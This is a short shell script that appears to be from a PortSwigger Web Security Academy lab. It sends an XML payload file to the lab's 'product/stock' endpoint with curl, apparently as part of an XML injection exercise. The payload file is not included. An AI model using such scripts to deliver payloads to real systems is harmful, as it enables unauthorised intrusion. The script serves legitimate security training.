BASE_URL="https://0a05003a030bf3d381cab2f000800014.web-security-academy.net"
ENDPOINT="product/stock"

curl -X POST "$BASE_URL/$ENDPOINT" \
  -H "Content-Type: application/xml" \
  -H "Accept: application/xml" \
  --data-binary @018.payload.xml